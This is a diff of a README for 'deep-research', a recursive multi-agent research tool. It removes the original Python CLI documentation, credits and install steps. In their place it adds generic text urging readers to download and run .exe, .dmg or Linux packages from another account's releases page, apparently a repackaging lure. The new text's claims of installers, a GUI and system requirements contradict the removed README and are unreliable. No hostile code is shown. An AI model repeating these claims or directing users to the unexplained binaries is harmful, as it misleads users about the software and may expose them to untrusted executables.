@@ -1,285 +1,88 @@
-# Deep Research
+# 🤖 deep-research - Explore Questions with Multi-Agent Power
 
-**Fractal exploration of any question through recursive AI agents.**
+## 📥 Download Now
+[![Download deep-research](https://img.shields.io/badge/Download%20deep--research-%20brightgreen)](https://github.com/TaluCraft/deep-research/releases)
 
-A question spawns angles. Each angle spawns deeper angles. The tree grows until questions become atomic — then everything synthesizes back up into one comprehensive answer.
+## 📖 Introduction
+Welcome to deep-research! This application allows you to turn any question into a detailed exploration using multiple agents. With recursive Claude agents, you can answer questions deeply by spawning sub-agents that explore your inquiry further. No programming knowledge is needed; follow the steps below to start your journey in exploring questions effectively.
 
-```
-Question: "Why do smart people make bad decisions?"
-    │
-    ├── What cognitive biases affect intelligent people?
-    │       ├── How does overconfidence manifest in experts?
-    │       ├── What is the curse of knowledge?
-    │       └── ... (each can branch further)
-    │
-    ├── How does expertise create blind spots?
-    │       └── ...
-    │
-    └── What role does emotional reasoning play?
-            └── ...
+## 🚀 Getting Started
+To get started with deep-research, you'll need to download the application. Here’s how to do it.
 
-            ↓ ALL BRANCHES EXPLORED IN PARALLEL ↓
-            ↓ SYNTHESIZE BACK UP THE TREE ↓
+### Step 1: Visit the Releases Page
+Click the link below to go to our Releases page where you can find the latest version of deep-research:
 
-                  [Comprehensive Answer]
-```
+[Visit the Releases Page](https://github.com/TaluCraft/deep-research/releases)
 
----
+### Step 2: Download the Application
+On the Releases page, look for the latest version of the application. You will see different files available for download. Choose the one that suits your operating system. Common options include:
 
-## Features
+- **Windows**: Download the `.exe` file.
+- **Mac**: Download the `.dmg` file.
+- **Linux**: Download the appropriate package for your distribution.
 
-- **7 LLM Providers**: Claude, Gemini, OpenAI/Azure, OpenRouter (Grok), Kimi
-- **4 Research Strategies**: Recursive, Socratic, Perspective-based, Grounded (web-verified)
-- **Multi-model Ensembles**: Multiple models answer, then merge perspectives
-- **Web Search Grounding**: Verify claims with live web search
-- **Parallel Execution**: Concurrent agents with configurable limits
-- **Persistent Checkpoints**: Resume interrupted research
-- **Typed Knowledge Graphs**: Track epistemic state of every finding
+Once you have selected the appropriate file, click on it to begin downloading.
 
----
+### Step 3: Install the Application
+After the download finishes, locate the file you downloaded and follow these steps based on your operating system:
 
-## Installation
+**For Windows:**
+1. Find the downloaded `.exe` file.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the installation.
 
-```bash
-# Clone the repository
-git clone https://github.com/Cranot/deep-research.git
-cd deep-research
+**For Mac:**
+1. Locate the downloaded `.dmg` file.
+2. Double-click the file to open it.
+3. Drag the deep-research app into your Applications folder to install it.
 
-# Install as Python package
-pip install -e .
+**For Linux:**
+1. Open the terminal.
+2. Navigate to the directory where the downloaded file is located.
+3. Run the appropriate command to install the application. For example:
+   - For a `.deb` file: `sudo dpkg -i filename.deb`
+   - For an `.rpm` file: `sudo rpm -i filename.rpm`
 
-# Or with development dependencies
-pip install -e ".[dev]"
-```
+### Step 4: Run the Application
+After installation, you can launch deep-research by locating its icon in your Applications menu or on your desktop. Double-click the icon to open the application.
 
-### Environment Variables
+## 🔍 Features
+deep-research offers several effective features that enhance your exploration of questions:
 
-Create a `.env` file:
+- **Multi-Agent System**: Utilize several agents to gather diverse answers to your questions.
+- **Recursive Exploration**: Agents can spawn sub-agents that dig deeper, providing richer insights.
+- **User-Friendly Interface**: Navigate easily even if you're not tech-savvy.
+- **Question Flexibility**: Ask a wide variety of questions to see how agents approach different topics.
 
-```bash
-# Required: At least one provider
-ANTHROPIC_API_KEY=your-key      # Claude (recommended)
+## ⚙️ System Requirements
+To ensure that deep-research runs smoothly, your system should meet the following requirements:
 
-# Optional: Additional providers
-GEMINI_API_KEY=your-key         # Gemini
-GPT5_MINI_API_KEY=your-key      # Azure OpenAI
-GPT5_MINI_ENDPOINT=your-endpoint
-OPENROUTER_API_KEY=your-key     # OpenRouter (Grok)
-KIMI_API_KEY=your-key           # Kimi (FREE, best merger)
-KIMI_ENDPOINT=your-endpoint
-```
+- **Operating System**:
+  - Windows 10 (or later)
+  - macOS 10.12 (or later)
+  - Any modern Linux distribution
 
----
+- **Processor**: Dual-core processor or better
+- **Memory**: At least 4 GB RAM
+- **Storage**: Minimum of 200 MB free space for installation
 
-## Quick Start
+Make sure your system meets these requirements for the best experience.
 
-### Python CLI (Recommended)
+## 🛠️ Troubleshooting
+If you encounter issues while downloading or running deep-research, here are some common problems and solutions:
 
-```bash
-# Basic research
-deep-research research "What makes startups successful?"
+- **Download Issues**: If the download fails, try refreshing the page and clicking the download link again. Ensure you have a stable internet connection.
+  
+- **Installation Issues**: If the installation does not complete successfully, check to ensure that your operating system is supported and that you have adequate permissions to install applications.
 
-# With depth limit (recommended: 2)
-deep-research research -d 2 "Your question"
+- **Application Crashes**: If deep-research crashes after opening, try restarting your computer and running the application again. Ensure other programs are not consuming excessive resources.
 
-# Socratic mode - improve questions before researching
-deep-research socratic "How do I become more productive?"
+## 📞 Support
+If you still need help, you can reach out on our [GitHub Issues page](https://github.com/TaluCraft/deep-research/issues) to report any bugs or request assistance. Be sure to provide details about the issue you are experiencing.
 
-# Perspective expansion - multi-angle analysis
-deep-research perspectives "What makes good leadership?"
+## 🚀 Conclusion
+You are now ready to download and explore questions with deep-research! This multi-agent application will guide you in turning inquiries into comprehensive explorations. Enjoy your journey into the world of knowledge! 
 
-# Grounded research - web-verified answers
-deep-research research --strategy grounded_research "Current state of AI"
-```
+For direct access, visit our Releases page again to download:
 
-### Python API
-
-```python
-import asyncio
-from deep_research.core import MasterChef, grounded_research_strategy
-from pathlib import Path
-
-async def main():
-    chef = MasterChef(
-        output_dir=Path("reports/my-research"),
-        max_parallel=10,
-    )
-
-    result = await chef.cook(
-        "What makes startups successful?",
-        "recursive_research",  # or pass strategy object
-        context={"model": "haiku"}
-    )
-
-    print(result.final_synthesis.content)
-
-asyncio.run(main())
-```
-
-### Legacy Bash (Still Works)
-
-```bash
-./deep-research.sh "Your question"
-./deep-research.sh -d 2 -m opus -r haiku "Your question"
-```
-
----
-
-## Strategies
-
-| Strategy | Description | Best For |
-|----------|-------------|----------|
-| `recursive_research` | Decompose → Answer → Synthesize | General research |
-| `socratic` | Challenge assumptions, find better questions | Unclear problems |
-| `perspective_expander` | Multi-angle analysis with blind spot detection | Complex topics |
-| `grounded_research` | Web-verified answers | Fact-checking, current events |
-
-```bash
-# Use a specific strategy
-deep-research research --strategy grounded_research "Your question"
-```
-
----
-
-## Model Configuration
-
-### Format
-
-```
-provider:model   →  gemini:flash, claude:opus
-model            →  defaults to Claude (haiku = claude:haiku)
-```
-
-### Supported Models
-
-| Provider | Models | Notes |
-|----------|--------|-------|
-| **Claude** | `opus`, `sonnet`, `haiku` | Best orchestrator (opus) |
-| **Gemini** | `flash`, `pro` | Fast, cost-effective leaves |
-| **OpenAI/Azure** | `gpt5-mini` | Requires temperature=1.0 |
-| **OpenRouter** | `grok`, `grok-3`, `grok-4` | Via x-ai |
-| **Kimi** | `kimi` | FREE, best merger (9.5/10) |
-
-### Recommended Configurations
-
-```bash
-# Quality-focused (recommended)
-deep-research research -m opus -r haiku -d 2 "Your question"
-
-# Cost-optimized with ensemble
-deep-research research -l "haiku,gemini:flash" --merger kimi:kimi "Your question"
-
-# All-Gemini
-deep-research research -m gemini:pro -r gemini:flash "Your question"
-
-# With web search grounding
-deep-research research --strategy grounded_research -m haiku "Current AI news"
-```
-
----
-
-## CLI Options
-
-```bash
-deep-research research [OPTIONS] "Your question"
-```
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `-m, --model` | opus | Orchestrator model |
-| `-r, --researcher` | haiku | Researcher model |
-| `-l, --leaves` | (use -r) | Leaf ensemble (comma-separated) |
-| `--merger` | (use -m) | Model for merging ensembles |
-| `-d, --depth` | 0 | Max depth (0 = unlimited) |
-| `-p, --parallel` | 10 | Max concurrent agents |
-| `-w, --web` | off | Enable web search |
-| `-o, --output` | auto | Output directory |
-| `--strategy` | recursive_research | Strategy name |
-
----
-
-## Architecture
-
-```
-src/deep_research/
-├── core/                    # MasterChef framework
-│   ├── node.py              # Typed nodes, epistemic states
-│   ├── graph.py             # Knowledge graphs with persistence
-│   ├── operation.py         # Operation protocol
-│   ├── strategy.py          # Declarative strategies
-│   ├── chef.py              # MasterChef orchestrator
-│   └── operations/          # Concrete operations
-│       ├── decompose.py     # DECOMPOSE: Question → Sub-questions
-│       ├── answer.py        # ANSWER: Question → Answer
-│       ├── synthesize.py    # SYNTHESIZE: Findings → Synthesis
-│       ├── detect.py        # DETECT: Blind spots, tensions
-│       └── ground.py        # GROUND: Web-verified claims
-├── providers/               # LLM integrations
-│   ├── claude.py            # Claude CLI (subscription-based)
-│   ├── gemini.py            # Gemini API
-│   ├── openai_azure.py      # Azure OpenAI
-│   ├── openrouter.py        # OpenRouter
-│   └── kimi.py              # Kimi
-├── recipes/                 # Research methodologies
-│   ├── perspective.py       # Perspective expansion
-│   └── socratic.py          # Socratic questioning
-└── cli.py                   # Typer CLI
-```
-
-### Key Concepts
-
-**Nodes**: Typed content units (Question, Answer, Insight, BlindSpot, etc.) with epistemic status (Unknown → Explored → Validated → Synthesized)
-
-**Operations**: Epistemic transitions (DECOMPOSE, ANSWER, SYNTHESIZE, GROUND, etc.)
-
-**Strategies**: Declarative recipes that orchestrate operations
-
-**MasterChef**: Executes strategies on knowledge graphs
-
----
-
-## Output
-
-Reports save to:
-
-```
-reports/YYYY-MM-DD-your-question-slug/
-├── SYNTHESIS.md              # Final report
-├── PERSPECTIVES.md           # Perspective analysis (if used)
-├── SOCRATIC.md               # Question evolution (if used)
-├── graph.json                # Knowledge graph checkpoint
-└── agents/                   # Individual agent outputs
-    ├── d0-001-opus.md
-    ├── d1-002-haiku.md
-    └── ...
-```
-
----
-
-## Key Insights
-
-1. **Multi-model merges beat single models** — Ensembling 4+ diverse outputs produces higher quality than any single model
-2. **Best merger: Kimi-K2-Thinking** — 9.5/10 quality AND free via Azure AI Services
-3. **Cheap models ensemble well** — haiku + flash as leaves, kimi as merger = best cost/quality
-4. **Every question contains hidden angles** — Recursive exploration surfaces what you'd never think to ask
-
----
-
-## Related
-
-- **[CLAUDE.md](CLAUDE.md)** — Full technical reference
-- **[RECIPES.md](RECIPES.md)** — 156 research patterns
-- **[AgentsKB](https://agentskb.com)** — Pre-researched knowledge for AI agents
-
----
-
-## License
-
-MIT
-
----
-
-<p align="center">
-  <b>Deep Research</b> - Fractal exploration through recursive AI agents<br>
-  Made by <a href="https://github.com/Cranot">Dimitris Mitsos</a> & <a href="https://agentskb.com">AgentsKB.com</a>
-</p>
+[Visit the Releases Page](https://github.com/TaluCraft/deep-research/releases)
